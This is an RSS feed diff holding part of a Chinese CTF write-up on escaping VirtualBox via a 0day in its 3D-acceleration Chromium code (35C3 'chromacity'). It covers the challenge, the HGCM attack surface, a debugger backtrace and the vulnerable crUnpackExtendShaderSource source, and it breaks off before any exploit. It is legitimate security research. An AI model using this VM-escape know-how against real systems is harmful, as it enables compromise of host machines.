@@ -5,7 +5,440 @@
 <link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/</link>
 <description>安全攻防技术分享</description>
 <language>zh-cn</language>
-<lastBuildDate>Thu, 07 Mar 2019 12:15:54 +0800</lastBuildDate>
+<lastBuildDate>Tue, 12 Mar 2019 17:15:33 +0800</lastBuildDate>
+<item>
+<title>48小时逃逸Virtualbox虚拟机——记一次CTF中的0day之旅</title>
+<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2019-03-11-58910752.html</link>
+<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/58910752&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
+&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-e05fb9386d014f04628ac1a470d56f82_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;作者:&lt;/b&gt; &lt;a class=&quot;member_mention&quot; href=&quot;http://www.zhihu.com/people/1147d134e271d3e7428150977892bb51&quot; data-hash=&quot;1147d134e271d3e7428150977892bb51&quot; data-hovercard=&quot;p$b$1147d134e271d3e7428150977892bb51&quot;&gt;@flyyy&lt;/a&gt; &lt;/p&gt;&lt;p&gt;&lt;b&gt;长亭科技安全研究员，曾获得GeekPwn 2018“最佳技术奖”，入选极棒名人堂。&lt;/b&gt;&lt;/p&gt;&lt;blockquote&gt;35C3CTF中niklasb出了一道关于virtualbox逃逸的0day题目，想从这个题目给大家介绍virtualbox的一个新的攻击面（其实类似的攻击面也同样存在于其他虚拟化类软件），这里记录一下和@kelwin一起解题的过程（被dalao带飞真爽）&lt;/blockquote&gt;&lt;h2&gt;&lt;b&gt;题目描述&lt;/b&gt;&lt;/h2&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&lt;span&gt;&lt;/span&gt;chromacity 477
+Solves: 2
+Please escape VirtualBox. 3D acceleration is enabled for your convenience.
+​
+No need to analyze the 6.0 patches, they should not contain security fixes.
+​
+Once you&#39;re done, submit your exploit at https://vms.35c3ctf.ccc.ac/, but assume that all passwords are different on the remote setup.
+​
+Challenge files. Password for the encrypted VM image is the flag for &quot;sanity check&quot;.
+​
+Setup
+​
+UPDATE: You might need to enable nested virtualization.
+​
+Hint: https://github.com/niklasb/3dpwn/ might be useful
+​
+Hint 2: this photo was taken earlier today at C3
+​
+Difficulty estimate: hard
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;    题目描述中可以看出：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;虚拟机配置中显卡开启了3D加速功能&lt;/li&gt;&lt;li&gt;6.0的patch没用，参考virtualbox 6.0的发布时间推测是出题人来不及用最新版适配环境等等，所以是一道0day题目&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;    题目前前后后给出了四个附件，一个是img文件，一个是通过qemu+kvm虚拟机运行该img的.sh文件，这个虚拟机就是远程运行的host的环境，host当中有一个5.28 release版的virtualbox，也就是我们逃逸的目标。（算上启动host环境中的virtualbox，如果你的主机是windows+vmware workstation的话。。。满眼都是泪），另外还有两张图片，一张是关于目标virtualbox虚拟机的配置，一张是niklasb和他电脑屏幕的照片。电脑屏幕上显示的是&lt;a href=&quot;http://link.zhihu.com/?target=https%3A//www.khronos.org/registry/OpenGL-Refpages/gl4/html/glShaderSource.xhtml&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;这个页面&lt;/a&gt;，看样子题目应该跟glShaderSource这个opengl的api有关。&lt;/p&gt;&lt;p&gt;    同时给出的两个hint，一个是niklasb自己关于3dpwn的github链接，其中有他之前通过攻击virtual box 3D加速模块实现逃逸的源码和相关&lt;a href=&quot;http://link.zhihu.com/?target=https%3A//phoenhex.re/2018-07-27/better-slow-than-sorry&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;分析文章&lt;/a&gt;。另一个就是附件中关于niklasb的照片。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;题目分析&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;    通过题目描述我们可以比较确定的是出题人希望我们去找virtualbox 3D加速部分的0day漏洞来实现逃逸，同时通过他给出的github链接中的文章和题目名我们可以很快把目标锁定在3D加速部分的&lt;a href=&quot;http://link.zhihu.com/?target=http%3A//chromium.sourceforge.net/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;Chromium&lt;/a&gt;代码上（并不是同名的浏览器项目）。&lt;/p&gt;&lt;p&gt;    简单来说，virtualbox通过引入OpenGL的共享库来引入3D加速功能，而Chromium负责解析Virtualbox。Chromium定义了一套用来描述OpenGL不同操作的网络协议。但是这个Chromium库最后一次更新源码已经是在十二年前了。同时通过这个库我们大概可以猜到之前hint中那张照片的用意了。如果排除掉去直接挖掘OpenGL的0day的可能性，那Virtualbox代码中关于glShaderSource的部分就只有Chromium中关于这个api的协议解析的部分了。而恰好niklasb的github中的源码和文章都是关于Chromium部分的漏洞及其利用的。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;源码分析&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;    Virtualbox的Guest additions类似于VMware workstation中的vmware-tools。不同的地方在于，VMware workstation通过暴漏固定的端口给guest来实现guest与host的通信，而Guest additions是通过增加一个自定义的虚拟硬件vboxguest来实现guest与host的交互。而3D加速是作为一个virtualbox自定义的hgcm服务进程存在的。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&lt;span&gt;&lt;/span&gt;gdb-peda$ i thread
+  Id   Target Id         Frame 
+* 1    Thread 0x7fe77f6d9780 (LWP 14933) &quot;VirtualBoxVM&quot; 0x00007fe77b0acbf9 in __GI___poll (fds=0x55fe988e82b0, nfds=0x2, timeout=0x63) at ../sysdeps/unix/sysv/linux/poll.c:29
+......
+  15   Thread 0x7fe72f86a700 (LWP 14965) &quot;ShCrOpenGL&quot; 0x00007fe77a4959f3 in futex_wait_cancelable (private=&amp;lt;optimized out&amp;gt;, expected=0x0, futex_word=0x7fe720004068)
+......
+  35   Thread 0x7fe6d0cd6700 (LWP 14985) &quot;nspr-3&quot; 0x00007fe77a4959f3 in futex_wait_cancelable (private=&amp;lt;optimized out&amp;gt;, expected=0x0, futex_word=0x55fe9868ed70)
+    at ../sysdeps/unix/sysv/linux/futex-internal.h:88
+  36   Thread 0x7fe6b9b61700 (LWP 14986) &quot;SHCLIP&quot; 0x00007fe77b0acbf9 in __GI___poll (fds=0x7fe6b4000b20, nfds=0x2, timeout=0xffffffff) at ../sysdeps/unix/sysv/linux/poll.c:29
+gdb-peda$ thread 15
+[Switching to thread 15 (Thread 0x7fe72f86a700 (LWP 14965))]
+#0  0x00007fe77a4959f3 in futex_wait_cancelable (private=&amp;lt;optimized out&amp;gt;, expected=0x0, futex_word=0x7fe720004068) at ../sysdeps/unix/sysv/linux/futex-internal.h:88
+88  ../sysdeps/unix/sysv/linux/futex-internal.h: No such file or directory.
+gdb-peda$ bt
+#0  0x00007fe77a4959f3 in futex_wait_cancelable (private=&amp;lt;optimized out&amp;gt;, expected=0x0, futex_word=0x7fe720004068) at ../sysdeps/unix/sysv/linux/futex-internal.h:88
+#1  __pthread_cond_wait_common (abstime=0x0, mutex=0x7fe720004070, cond=0x7fe720004040) at pthread_cond_wait.c:502
+#2  __pthread_cond_wait (cond=0x7fe720004040, mutex=0x7fe720004070) at pthread_cond_wait.c:655
+#3  0x00007fe77e0e5cc8 in rtSemEventWait (fAutoResume=0x1, cMillies=0xffffffff, hEventSem=0x7fe720004040)
+    at /home/f1yyy/Desktop/VirtualBox-6.0.0/src/VBox/Runtime/r3/linux/../posix/semevent-posix.cpp:369
+#4  RTSemEventWait (hEventSem=0x7fe720004040, cMillies=0xffffffff) at /home/f1yyy/Desktop/VirtualBox-6.0.0/src/VBox/Runtime/r3/linux/../posix/semevent-posix.cpp:482
+#5  0x00007fe75d3b09aa in HGCMThread::MsgGet (this=0x7fe720003f60, ppMsg=0x7fe72f869cf0) at /home/f1yyy/Desktop/VirtualBox-6.0.0/src/VBox/Main/src-client/HGCMThread.cpp:549
+#6  0x00007fe75d3b147f in hgcmMsgGet (pThread=0x7fe720003f60, ppMsg=0x7fe72f869cf0) at /home/f1yyy/Desktop/VirtualBox-6.0.0/src/VBox/Main/src-client/HGCMThread.cpp:734
+#7  0x00007fe75d3b265c in hgcmServiceThread (pThread=0x7fe720003f60, pvUser=0x7fe720003e00) at /home/f1yyy/Desktop/VirtualBox-6.0.0/src/VBox/Main/src-client/HGCM.cpp:608
+#8  0x00007fe75d3af940 in hgcmWorkerThreadFunc (hThreadSelf=0x7fe720004340, pvUser=0x7fe720003f60) at /home/f1yyy/Desktop/VirtualBox-6.0.0/src/VBox/Main/src-client/HGCMThread.cpp:200
+#9  0x00007fe77df95501 in rtThreadMain (pThread=0x7fe720004340, NativeThread=0x7fe72f86a700, pszThreadName=0x7fe720004c20 &quot;ShCrOpenGL&quot;)
+    at /home/f1yyy/Desktop/VirtualBox-6.0.0/src/VBox/Runtime/common/misc/thread.cpp:719
+#10 0x00007fe77e0df882 in rtThreadNativeMain (pvArgs=0x7fe720004340) at /home/f1yyy/Desktop/VirtualBox-6.0.0/src/VBox/Runtime/r3/posix/thread-posix.cpp:327
+#11 0x00007fe77a48f6db in start_thread (arg=0x7fe72f86a700) at pthread_create.c:463
+#12 0x00007fe77b0b988f in clone () at ../sysdeps/unix/sysv/linux/x86_64/clone.S:95
+​
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;    也就是说，当我们想要在guest中想要调用一个OpenGL的某个接口，需要根据我们的请求先进行Chromium的协议封装，再进行hgcm的协议封装。具体关于virtualbox在这两部分的实现细节，请阅读virtualbox相关源码，这里不再详述。&lt;/p&gt;&lt;p&gt;    niklasb在其github上已经封装好了调用Chromium代码部分的函数及例子,比如下面这两行代码：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&lt;span&gt;&lt;/span&gt;client = hgcm_connect(&quot;VBoxSharedCrOpenGL&quot;)
+hgcm_call(client, SHCRGL_GUEST_FN_SET_VERSION, [9, 1])
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;    最终在源码中会触发到src/vbox/hostservices/sharedopengl/crservice/crservice.cpp中的switch下的SHCRGL_GUEST_FN_SET_VERSION部分，其中的vMajor和vMinor会分别为9和1。         &lt;/p&gt;&lt;p&gt;    再次回到题目上来，题目已经提醒了漏洞存在的位置可能在Chromium中glShaderSource相关的接口位置，通过在源码中的寻找与分析，我们把目标锁定在了crUnpackExtendShaderSource函数中。crUnpackExtendShaderSource代码如下：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;crUnpackExtendShaderSource&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;GLint&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;length&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;GLuint&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shader&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;READ_DATA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GLuint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;GLsizei&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;READ_DATA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GLsizei&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;GLint&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hasNonLocalLen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;READ_DATA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GLsizei&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;GLint&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pLocalLength&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DATA_POINTER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GLint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ppStrings&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;GLsizei&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;jUpTo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pos_check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;UINT32_MAX&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;crError&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;crUnpackExtendShaderSource: count %u is out of range&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;pos&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pLocalLength&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hasNonLocalLen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;length&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DATA_POINTER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GLint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;pos&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;pos_check&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DATA_POINTER_CHECK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pos_check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;crError&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;crUnpackExtendShaderSource: pos %d is out of range&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pos_check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pLocalLength&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pos_check&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;INT32_MAX&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pLocalLength&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DATA_POINTER_CHECK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pos_check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;crError&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;crUnpackExtendShaderSource: pos %d is out of range&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pos_check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;pos_check&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pLocalLength&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;ppStrings&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;crAlloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ppStrings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;ppStrings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DATA_POINTER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;pos&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pLocalLength&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;pLocalLength&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;Assert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pLocalLength&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
